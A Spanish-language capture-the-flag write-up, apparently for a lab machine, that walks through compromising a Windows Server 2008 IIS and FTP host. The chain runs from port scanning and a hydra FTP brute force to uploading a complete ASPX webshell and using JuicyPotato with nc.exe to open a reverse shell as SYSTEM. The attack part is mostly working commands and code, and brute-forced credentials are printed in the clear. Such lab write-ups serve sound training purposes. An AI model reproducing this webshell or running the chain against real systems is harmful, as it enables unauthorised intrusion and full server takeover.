# Windows Server 2008 IIS + FTP → SYSTEM (JuicyPotato) Writeup

## 1. Enumeración

``` bash
nmap -sC -sS -sV -p- 10.0.50.40
```

Puertos relevantes:

-   21 → FTP (Microsoft ftpd)
-   80 → HTTP (Microsoft IIS 7.0)
-   135 → RPC
-   139 / 445 → SMB
-   Varios puertos RPC dinámicos

El servidor HTTP reporta:

    Microsoft-IIS/7.0
    Title: Apache2 Debian Default Page

Esto indica inconsistencia (IIS mostrando página Apache). Posible pista
de CTF o archivos copiados manualmente.

------------------------------------------------------------------------

## 2. Enumeración SMB

``` bash
smbclient -L //10.0.50.40 -N
```

Sesión anónima permitida pero sin acceso útil.

``` bash
enum4linux -a 10.0.50.40
```

Permite sesión vacía, pero sin enumeración sensible.

------------------------------------------------------------------------

## 3. Enumeración Web

``` bash
whatweb http://10.0.50.40
curl -I http://10.0.50.40
```

Confirmamos IIS 7.0 + ASP.NET.

### Fuzzing

``` bash
gobuster dir -u http://10.0.50.40 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,asp,aspx
```

Encontramos:

    /shell.aspx

También:

    /aspnet_client/system_web/

------------------------------------------------------------------------

## 4. Ataque FTP

Fuerza bruta:

``` bash
hydra -L users.txt -P passwords.txt -f -t 4 10.0.50.40 ftp
```

Credenciales obtenidas:

    login: info
    password: PolniyPizdec0211

Accedemos:

``` bash
ftp 10.0.50.40
```

⚠ IMPORTANTE: usar modo binario para subir ejecutables

    binary

Probamos subida:

``` bash
echo hola > test.txt
put test.txt
```

Archivo accesible vía navegador → FTP apunta al webroot.

------------------------------------------------------------------------

## 5. Webshell

Creamos `shell.aspx`:

``` aspx
<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<html>
<body>
<form method="GET">
<input type="text" name="cmd" />
<input type="submit" value="Run" />
</form>
<pre>
<%
string cmd = Request.QueryString["cmd"];
if (!string.IsNullOrEmpty(cmd))
{
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + cmd;
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.UseShellExecute = false;
    p.Start();
    string output = p.StandardOutput.ReadToEnd();
    Response.Write(output);
}
%>
</pre>
</body>
</html>
```

Subimos y ejecutamos comandos.

Usuario actual:

    nt authority\servicio de red

Privilegios interesantes:

    SeImpersonatePrivilege → Habilitada

------------------------------------------------------------------------

## 6. Información del Sistema

``` cmd
systeminfo
```

Resultado:

-   Windows Server 2008 Datacenter
-   SP1
-   x86 (32 bits)

------------------------------------------------------------------------

## 7. Escalada de Privilegios -- JuicyPotato

Descargamos versión x86 de:

-   JuicyPotato
-   nc.exe (x86)

Subimos en modo binary.

Listener en Kali:

``` bash
nc -lvnp 443
```

Ejecución:

``` cmd
C:\inetpub\wwwroot\JuicyPotato.exe -l 1337 -p C:\inetpub\wwwroot\nc.exe -a "10.0.50.4 443 -e cmd.exe" -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}
```

Shell recibida.

------------------------------------------------------------------------

## 8. Acceso SYSTEM

``` cmd
whoami
```

Resultado:

    nt authority\system

Confirmamos privilegios completos:

``` cmd
whoami /all
whoami /priv
```

------------------------------------------------------------------------

## 9. Flags

Navegación:

``` cmd
cd C:\Users
dir
cd Administrator\Desktop
type root.txt
```

Para usuario estándar:

``` cmd
cd C:\Users\<usuario>\Desktop
type user.txt
```

------------------------------------------------------------------------

## 10. Conclusión

Cadena de ataque:

1.  Enumeración de servicios.
2.  Fuerza bruta FTP.
3.  Subida de webshell ASPX.
4.  Identificación de SeImpersonatePrivilege.
5.  Explotación JuicyPotato.
6.  Obtención de SYSTEM.
7.  Lectura de flags.

Escalada completada con éxito.
